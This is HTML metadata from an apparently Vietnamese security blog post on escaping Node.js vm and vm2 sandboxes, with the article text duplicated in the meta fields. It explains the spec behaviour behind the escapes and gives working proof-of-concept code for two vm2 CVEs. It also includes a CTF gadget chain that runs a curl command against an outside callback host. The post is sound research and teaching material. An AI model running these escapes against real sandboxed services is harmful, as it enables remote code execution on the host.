HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]). Trong này có 1 đoạn quan trọng là rejectJob = NewPromiseReactionJob(rejectReaction, reason) vì nó sẽ là điều kiện để chúng ta thực hiện RCE Tiếp tục đọc mã giả của NewPromiseReactionJob 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called: a. Let promiseCapability be reaction.[[Capability]]. b. Let type be reaction.[[Type]]. c. Let handler be reaction.[[Handler]]. d. **If handler is empty, then** i. If type is Fulfill, let handlerResult be NormalCompletion(argument). ii. Else, 1. Assert: type is Reject. 2. **Let handlerResult be ThrowCompletion(argument).** e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)). f. If promiseCapability is undefined, then i. Assert: handlerResult is not an abrupt completion. ii. Return empty. g. Assert: promiseCapability is a PromiseCapability Record. h. **If handlerResult is an abrupt completion, then** i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).** i. Else, i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »). Ta sẽ chú ý đến các đoạn d.ii, h.i Nếu handler không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối. Sau đó là Nếu handlerResult là một hoàn thành đột ngột(abrupt completion), thì Trả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult. Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau: Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý resolve và reject(ta bỏ payload vào đây) Gọi then để trigger Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). và ez RCE CVE-2023-32314 1 A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const { VM } = require(&quot;vm2&quot;); const vm = new VM(); const code = ` const err = new Error(); err.name = { toString: new Proxy(() =&gt; &quot;&quot;, { apply(target, thiz, args) { const process = args.constructor.constructor(&quot;return process&quot;)(); throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;echo hacked&quot;).toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; } `; console.log(vm.run(code)); Phân tích CVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơn Khi err.name.toString được gọi ở ErrorPrototypeToString trong prepareStackTrace thì nó lại là trong ngữ cảnh của máy chính error của prepareStackTrace không được xử lý qua cơ chế proxy của vm2 nên nó được gọi thẳng bởi V8 Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau 1 2 7. Let argArray be CreateArrayFromList(argumentsList). 8. Return ? Call(trap, handler, « target, thisArgument, argArray »). Khi err.name.toString được gọi thì CreateArrayFromList() sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào apply(target, thiz, args). Vậy ta có thể tiếp cận được Function ở máy chính. Từ đó RCE Gadgets chaining Gadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCE Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString();" />
<link rel="canonical" href="http://localhost:4000/posts/Nodejs-escapeVM/" />
<meta property="og:url" content="http://localhost:4000/posts/Nodejs-escapeVM/" />
<meta property="og:site_name" content="Yuu’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-11T23:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="NodeJS escape VM and some gadgets chaining in NodeJS" />
<meta name="twitter:site" content="@anzuukino" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-08-16T19:19:31+07:00","datePublished":"2024-08-11T23:00:00+07:00","description":"NodeJS escape VM and some gadgets chaining in NodeJS Sandbox là gì? Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính. Escape VM VM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chính Module VM Sử dụng module node:vm (ngoài ra còn có vm2 ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const vm = require(&#39;node:vm&#39;); const x = 1; const context = { x: 2 }; vm.createContext(context); // tạo ngữ cảnh const code = &#39;x += 40; var y = 17;&#39;; // `x` and `y` are global variables in the context. // Initially, x has the value 2 because that is the value of context.x. vm.runInContext(code, context); console.log(context.x); // 42 console.log(context.y); // 17 console.log(x); console.log(y); // 1; y is not defined. Có nghĩa là code chạy trong context sẽ không ảnh hưởng đến biến ngoài context và ngược lại An insecure JavaScript sandbox vm.runInThisContext(code): Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khác 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); let globalobject = process; const vmResult = vm.runInThisContext(&#39;process&#39;);; if (globalobject === vmResult) { console.log(&#39;VM is running in the global context&#39;); } ///VM is running in the global context 1 2 3 4 5 6 7 const vm = require(&#39;vm&#39;); let localVar = &#39;di&#39;; const vmResult = vm.runInThisContext(&#39;localVar = &quot;box&quot;;&#39;); console.log(&#39;vmResult:&#39;, vmResult); console.log(&#39;localVar:&#39;, localVar); // vmResult: &#39;box&#39;, localVar: &#39;di&#39; vm.createContext([sandbox]): Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong global 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); global.test = 9; const sandbox = { test : 9}; vm.createContext(sandbox); vm.runInContext(&#39;test = test + 3&#39;, sandbox); console.log(global.test); // 9 console.log(sandbox); // { test: 12 } Hàm vm.runInNewContext(code[, sandbox][, options]) là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm một vm.Script là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox. script có thể được chạy thông qua runInNewContext Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng process. Một khi đã có được đối tượng process, chúng ta có thể sử dụng require để nhập child_process và sau đó dùng child_process để thực thi các lệnh hệ thống. Mặc dù đối tượng process được gắn vào global, khi tạo một ngữ cảnh mới (sử dụng createContext), đối tượng global không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng process từ global vào môi trường sandbox. 1 2 3 const vm = require(&quot;vm&quot;); const test = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`); console.log(test); hoặc 1 2 3 4 5 const vm = require(&#39;vm&#39;); const sandbox = { test : 1337}; vm.createContext(sandbox); vm.runInContext(`test = this.constructor.constructor(&#39;return process.env&#39;)()`, sandbox); console.log(sandbox) Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên this trỏ đến runInContext ( hoặc runInNewContext), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được Function (cái này là của bên ngoài sandbox). Cuối cùng dựa vào Function mà ta vừa lấy được ta có thể lấy được process Nói một cách đơn giản, quá trình này ta chain các gadget để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandbox Sau khi có process thì RCE là chuyện đơn giản Một số trường hợp khác 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const vm = require(&#39;vm&#39;); const script = `(() =&gt; { const a = {}; a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor(&#39;return process&#39;))(); return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString(); }; return a; })()`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(&#39;Hello &#39; + res); Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là arguments.callee.caller. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại. Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính arguments.callee.caller sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox. Giải thích đơn giản Tóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là Function và arguments.callee.caller và từ đó ta có thể làm bất cứ điều gì. Ngoài vm ra thì còn một module khác là vm2 được coi là “bản nâng cấp” của vm. vm2 là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. vm2 dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như vm thì vm2 cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đây CVE-2023-37466 In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const {VM} = require(&quot;vm2&quot;); const vm = new VM(); const code = ` async function fn() { (function stack() { new Error().stack; stack(); })(); } p = fn(); p.constructor = { [Symbol.species]: class FakePromise { constructor(executor) { executor( (x) =&gt; x, (err) =&gt; { return err.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;); } ) } } }; p.then(); `; console.log(vm.run(code)); Phân tích Một trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCE Ban đầu khi mới vào thì Promise.prototype.then đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function onRejected Đọc document của ES2022 của Promise.prototype.then có chỉ một đoạn liên quan đến @@species ở đây link 1 2 3 4 5 6 7 When the then method is called with arguments onFulfilled and onRejected, the following steps are taken: 1. Let promise be the this value. 2. If IsPromise(promise) is false, throw a TypeError exception. **3. Let C be ? SpeciesConstructor(promise, %Promise%).** **4. Let resultCapability be ? NewPromiseCapability(C).** **5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).** Có 3 đoạn cần chú ý ở trên đó là SpeciesConstructor, NewPromiseCapability và PerformPromiseThen 1 2 3 4 5 6 7 1. Let C be ? Get(O, &quot;constructor&quot;). 2. If C is undefined, return defaultConstructor. 3. If Type(C) is not Object, throw a TypeError exception. 4. Let S be ? Get(C, @@species). 5. If S is either undefined or null, return defaultConstructor. 6. If IsConstructor(S) is true, return S. 7. Throw a TypeError exception. Đây là pesudo code của SpeciesConstructor cả đoạn trên tóm lại là nó sẽ return object @@species và tiếp theo là NewPromiseCapability 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1. If IsConstructor(C) is false, throw a TypeError exception. 2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1). 3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }. 4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called: a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception. b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception. c. Set promiseCapability.[[Resolve]] to resolve. d. Set promiseCapability.[[Reject]] to reject. e. Return undefined. 5. Let executor be CreateBuiltinFunction(executorClosure, 2, &quot;&quot;, « »). 6. Let promise be ? Construct(C, « executor »). 7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception. 8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception. 9. Set promiseCapability.[[Promise]] to promise. 10. Return promiseCapability. Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của @@sepcies, sau đó sử dụng executor là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là resolve và reject và gán mỗi giá trị vào resultCapability.[[Resolve]] và resultCapability.[[Reject]]. Tiếp tục ở đoạn PerformPromiseThen, nó có định nghĩa promise.[[PromiseState]] lúc bị rejected 1 2 3 4 5 6 7 8 9 8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }. 9. If promise.[[PromiseState]] is pending, then ... 10. Else if promise.[[PromiseState]] is fulfilled, then ... 11. Else, a. Assert: The value of promise.[[PromiseState]] is rejected. b. Let reason be promise.[[PromiseResult]]. c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, &quot;handle&quot;). d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason). e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]). Trong này có 1 đoạn quan trọng là rejectJob = NewPromiseReactionJob(rejectReaction, reason) vì nó sẽ là điều kiện để chúng ta thực hiện RCE Tiếp tục đọc mã giả của NewPromiseReactionJob 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called: a. Let promiseCapability be reaction.[[Capability]]. b. Let type be reaction.[[Type]]. c. Let handler be reaction.[[Handler]]. d. **If handler is empty, then** i. If type is Fulfill, let handlerResult be NormalCompletion(argument). ii. Else, 1. Assert: type is Reject. 2. **Let handlerResult be ThrowCompletion(argument).** e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)). f. If promiseCapability is undefined, then i. Assert: handlerResult is not an abrupt completion. ii. Return empty. g. Assert: promiseCapability is a PromiseCapability Record. h. **If handlerResult is an abrupt completion, then** i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).** i. Else, i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »). Ta sẽ chú ý đến các đoạn d.ii, h.i Nếu handler không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối. Sau đó là Nếu handlerResult là một hoàn thành đột ngột(abrupt completion), thì Trả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult. Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau: Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý resolve và reject(ta bỏ payload vào đây) Gọi then để trigger Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). và ez RCE CVE-2023-32314 1 A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const { VM } = require(&quot;vm2&quot;); const vm = new VM(); const code = ` const err = new Error(); err.name = { toString: new Proxy(() =&gt; &quot;&quot;, { apply(target, thiz, args) { const process = args.constructor.constructor(&quot;return process&quot;)(); throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;echo hacked&quot;).toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; } `; console.log(vm.run(code)); Phân tích CVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơn Khi err.name.toString được gọi ở ErrorPrototypeToString trong prepareStackTrace thì nó lại là trong ngữ cảnh của máy chính error của prepareStackTrace không được xử lý qua cơ chế proxy của vm2 nên nó được gọi thẳng bởi V8 Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau 1 2 7. Let argArray be CreateArrayFromList(argumentsList). 8. Return ? Call(trap, handler, « target, thisArgument, argArray »). Khi err.name.toString được gọi thì CreateArrayFromList() sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào apply(target, thiz, args). Vậy ta có thể tiếp cận được Function ở máy chính. Từ đó RCE Gadgets chaining Gadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCE Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString();","headline":"NodeJS escape VM and some gadgets chaining in NodeJS","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Nodejs-escapeVM/"},"url":"http://localhost:4000/posts/Nodejs-escapeVM/"}</script>
<!-- End Jekyll SEO tag -->


  <title>NodeJS escape VM and some gadgets chaining in NodeJS | Yuu's blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Yuu's blog">
<meta name="application-name" content="Yuu's blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
